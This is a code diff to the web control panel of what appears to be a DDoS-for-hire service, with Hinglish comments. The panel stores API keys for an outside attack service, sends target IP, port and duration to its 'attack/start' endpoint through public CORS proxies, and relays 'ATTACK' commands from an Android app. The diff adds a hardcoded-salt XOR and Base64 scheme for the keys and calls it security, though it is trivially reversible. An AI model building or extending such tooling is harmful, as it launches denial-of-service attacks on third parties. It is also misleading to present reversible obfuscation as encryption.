@@ -117,6 +117,30 @@
     </div>
 
     <script>
+        // SECURITY: API Keys ko plain text me save nahi karenge. XOR + Base64 obfuscation.
+        const SECRET_SALT = "VeilSecure2024"; // Ise change kar sakte ho agar chaho
+
+        function encryptKey(key) {
+            if (!key) return "";
+            let result = "";
+            for (let i = 0; i < key.length; i++) {
+                result += String.fromCharCode(key.charCodeAt(i) ^ SECRET_SALT.charCodeAt(i % SECRET_SALT.length));
+            }
+            return btoa(result); // Base64 encode
+        }
+
+        function decryptKey(encryptedKey) {
+            if (!encryptedKey) return "";
+            try {
+                const decoded = atob(encryptedKey);
+                let result = "";
+                for (let i = 0; i < decoded.length; i++) {
+                    result += String.fromCharCode(decoded.charCodeAt(i) ^ SECRET_SALT.charCodeAt(i % SECRET_SALT.length));
+                }
+                return result;
+            } catch (e) { return ""; }
+        }
+
         const dbUrlInput = document.getElementById('dbUrl');
         dbUrlInput.value = localStorage.getItem('dbUrl') || '';
         let generatedKeyText = "";
@@ -151,9 +175,13 @@
             const db = dbUrlInput.value;
             if (!db) return alert("𝐒𝐚𝐯𝐞 𝐃𝐁 𝐔𝐑𝐋 𝐟𝐢𝐫𝐬𝐭");
             let updateData = {};
-            for(let i=1; i<=10; i++) { updateData[`api_key_${i}`] = document.getElementById(`apiKey${i}`).value.trim(); }
+            for(let i=1; i<=10; i++) { 
+                const plainKey = document.getElementById(`apiKey${i}`).value.trim();
+                // Encrypt before saving to DB
+                updateData[`api_key_${i}`] = plainKey ? encryptKey(plainKey) : "";
+            }
             await fetch(`${db}settings/config.json`, { method: 'PATCH', body: JSON.stringify(updateData) });
-            alert("𝐀𝐏𝐈𝐬 𝐒𝐚𝐯𝐞𝐝 𝐭𝐨 𝐂𝐥𝐨𝐮𝐝!");
+            alert("𝐀𝐏𝐈𝐬 𝐄𝐧𝐜𝐫𝐲𝐩𝐭𝐞𝐝 & 𝐒𝐚𝐯𝐞𝐝 𝐭𝐨 𝐂𝐥𝐨𝐮𝐝!");
             fetchApis();
         }
         function updateApi() { saveApi(); }
@@ -171,13 +199,15 @@
                 testBtnContainer.innerHTML = "";
                 if (data) {
                     for(let i=1; i<=10; i++) {
-                        const keyVal = data[`api_key_${i}`] || "";
-                        document.getElementById(`apiKey${i}`).value = keyVal;
-                        if(keyVal.trim() !== "") {
+                        const encryptedVal = data[`api_key_${i}`] || "";
+                        const decryptedVal = decryptKey(encryptedVal);
+                        document.getElementById(`apiKey${i}`).value = decryptedVal;
+                        
+                        if(decryptedVal.trim() !== "") {
                             const btn = document.createElement('button');
                             btn.innerText = `𝐓𝐞𝐬𝐭 𝐀𝐏𝐈 𝐒𝐥𝐨𝐭 ${i}`;
                             btn.className = "info"; btn.style.width = "auto";
-                            btn.onclick = () => testApi(keyVal, i);
+                            btn.onclick = () => testApi(decryptedVal, i);
                             testBtnContainer.appendChild(btn);
                         }
                     }
@@ -190,7 +220,8 @@
             resDiv.innerHTML = `<span style="color:#00e5ff;">𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐒𝐥𝐨𝐭 ${slotNumber}... 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭.</span>`;
             const targetUrl = `https://delvorn.vynqo.in/api/attack/start?key=${apiKey}&ip=1.1.1.1&port=80&time=10`;
             try {
-                const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`;
+                // Using stable CORS proxy
+                const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`;
                 const response = await fetch(proxyUrl);
                 const text = await response.text();
                 if (text.includes('"status": "success"') || text.includes('"status":"success"') || text.includes('Attack dispatched')) {
@@ -337,7 +368,7 @@
         }
 
         // ==========================================
-        // REAL APP CONNECTION LOGIC
+        // APP CONNECTION LOGIC (DECRYPTS API KEY HERE)
         // ==========================================
         window.addEventListener("message", async function(event) {
             if (event.data && event.data.action === "ATTACK") {
@@ -352,26 +383,30 @@
                 try {
                     const res = await fetch(`${db}settings/config.json`);
                     const data = await res.json();
+                    
                     let apiKey = "";
-                    for(let i=1; i<=10; i++) {
-                        if(data[`api_key_${i}`] && data[`api_key_${i}`].trim() !== "") {
-                            apiKey = data[`api_key_${i}`].trim();
-                            break;
+                    if (data) {
+                        for(let i=1; i<=10; i++) {
+                            const encryptedVal = data[`api_key_${i}`];
+                            if(encryptedVal && encryptedVal.trim() !== "") {
+                                // DECRYPT KEY HERE
+                                apiKey = decryptKey(encryptedVal);
+                                if(apiKey) break;
+                            }
                         }
                     }
 
                     if(!apiKey) {
-                        Android.onAttackResponse("ERROR", "No API Key Found in Panel");
+                        Android.onAttackResponse("ERROR", "No Valid API Key Found in Panel");
                         return;
                     }
 
                     const targetUrl = `https://delvorn.vynqo.in/api/attack/start?key=${apiKey}&ip=${ip}&port=${port}&time=${duration}`;
-                    const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`;
+                    const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`;
                     
                     const apiRes = await fetch(proxyUrl);
                     const apiText = await apiRes.text();
 
-                    // REAL CHECK: Agar API me "success" ya "dispatched" hai tabhi success bhejo
                     if (apiText.includes('"status": "success"') || apiText.includes('"status":"success"') || apiText.includes('Attack dispatched')) {
                         Android.onAttackResponse("SUCCESS", "Attack Launched!");
                     } else {
